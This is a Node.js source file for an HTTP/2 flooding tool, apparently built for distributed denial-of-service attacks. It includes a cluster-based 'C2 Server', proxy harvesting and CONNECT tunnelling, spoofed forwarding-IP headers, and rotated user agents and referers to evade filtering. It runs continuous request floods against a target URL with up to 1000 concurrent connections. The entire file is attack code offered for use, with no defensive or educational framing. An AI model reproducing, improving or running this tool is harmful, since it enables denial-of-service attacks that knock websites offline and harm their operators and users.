const net = require('net'), http2 = require('http2'), tls = require('tls'), cluster = require('cluster'), url = require('url'), crypto = require('crypto'), fs = require('fs'), UserAgent = require('user-agents'), args = { target: process.argv[2] || 'https://example.com', proxyFile: process.argv[3] || 'proxies.txt', duration: parseInt(process.argv[4]) || 60, workers: parseInt(process.argv[5]) || 4, rate: parseInt(process.argv[6]) || 100 }, proxies = fs.readFileSync(args.proxyFile, 'utf-8').split('\n').filter(Boolean), refers = ['https://www.google.com/search?q=', 'https://www.bing.com/search?q=', 'https://www.reddit.com/search?q=', 'https://search.yahoo.com/search?p='], methods = ['GET', 'POST', 'HEAD'], ciphers = tls.getCiphers().join(':'), ipSpoof = () => `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`, randomElement = (arr) => arr[Math.floor(Math.random() * arr.length)], randomString = (len) => crypto.randomBytes(Math.ceil(len / 2)).toString('hex').slice(0, len), parsedTarget = url.parse(args.target);

if (cluster.isMaster) { console.log(`Starting C2 Server on port 8080...`); const server = net.createServer((socket) => { socket.write(JSON.stringify({ target: args.target, rate: args.rate, duration: args.duration })); socket.on('data', (data) => console.log(`Agent reported: ${data}`)); }); server.listen(8080); for (let i = 0; i < args.workers; i++) cluster.fork(); setTimeout(() => process.exit(0), args.duration * 1000); } else { runAgent(); }

async function checkProxy(proxy) { return new Promise((resolve) => { const [host, port] = proxy.split(':'), socket = net.connect({ host, port, timeout: 2000 }); socket.on('connect', () => { socket.destroy(); resolve(true); }); socket.on('error', () => { socket.destroy(); resolve(false); }); socket.on('timeout', () => { socket.destroy(); resolve(false); }); }); }

let liveProxies = []; async function rotateProxies() { liveProxies = (await Promise.all(proxies.map(checkProxy))).reduce((acc, isLive, i) => { if (isLive) acc.push(proxies[i]); return acc; }, []); console.log(`Found ${liveProxies.length} live proxies`); }

async function runAgent() { await rotateProxies(); const userAgentGen = new UserAgent(); class NetSocket { constructor() {} async HTTP(options, callback) { const proxy = randomElement(liveProxies).split(':'), fakeIP = ipSpoof(), ua = userAgentGen.toString(), headers = { ':method': randomElement(methods), ':authority': parsedTarget.host, ':path': `${parsedTarget.path}?${randomString(10)}=${randomString(10)}`, ':scheme': 'https', 'Host': parsedTarget.host, 'User-Agent': ua, 'Referer': randomElement(refers) + randomString(5), 'X-Forwarded-For': fakeIP, 'X-Real-IP': fakeIP, 'Client-IP': fakeIP, 'Content-Type': 'application/x-www-form-urlencoded', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en-US,en;q=0.9', 'Cache-Control': 'no-cache', 'Pragma': 'no-cache', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1', 'sec-ch-ua': `"Chromium";v="${Math.floor(Math.random() * 20) + 100}", "Google Chrome";v="${Math.floor(Math.random() * 20) + 100}", "Not;A=Brand";v="99"`, 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'none', 'sec-fetch-user': '?1' }, socket = net.connect({ host: proxy[0], port: parseInt(proxy[1]) }); socket.setKeepAlive(true, 60000); socket.setTimeout(10000); socket.on('connect', () => { socket.write(`CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}\r\n\r\n`); }); socket.on('data', async (data) => { if (data.toString().includes('HTTP/1.1 200')) { const tlsOptions = { ALPNProtocols: ['h2'], ciphers: ciphers, secureProtocol: ['TLSv1_2_method', 'TLSv1_3_method'], secureOptions: crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3, socket: socket, servername: parsedTarget.host, rejectUnauthorized: false }, tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); tlsConn.setKeepAlive(true, 60000); const client = http2.connect(parsedTarget.href, { protocol: 'https:', settings: { headerTableSize: 65535, maxConcurrentStreams: 1000, initialWindowSize: 6291456, maxHeaderListSize: 262144 }, createConnection: () => tlsConn }); let requestCount = 0; const flood = setInterval(() => { if (requestCount >= args.rate) return; requestCount++; const req = client.request(headers); req.on('response', () => req.close()); req.on('error', () => req.close()); req.end(); }, 1000 / args.rate); setTimeout(() => clearInterval(flood), args.duration * 1000); client.on('error', () => { client.destroy(); socket.destroy(); }); client.on('close', () => socket.destroy()); } }); socket.on('error', (err) => callback(null, err)); socket.on('timeout', () => socket.destroy()); } } const Socker = new NetSocket(); let activeConnections = 0, maxConnections = 1000; const attack = async () => { while (true) { if (activeConnections < maxConnections) { activeConnections++; Socker.HTTP({ host: parsedTarget.host, port: 443 }, (sock, err) => { if (err) console.log(`Error: ${err.message}`); activeConnections--; }); } await new Promise((r) => setTimeout(r, 10)); } }; const c2Socket = net.connect({ host: 'localhost', port: 8080 }); c2Socket.on('data', (data) => { const cmd = JSON.parse(data); console.log(`Agent received: ${JSON.stringify(cmd)}`); attack(); }); c2Socket.on('error', () => { console.log('C2 Server offline, running standalone'); attack(); }); attack(); }

setInterval(() => { console.log(`Active Connections: ${activeConnections}, Live Proxies: ${liveProxies.length}`); }, 5000);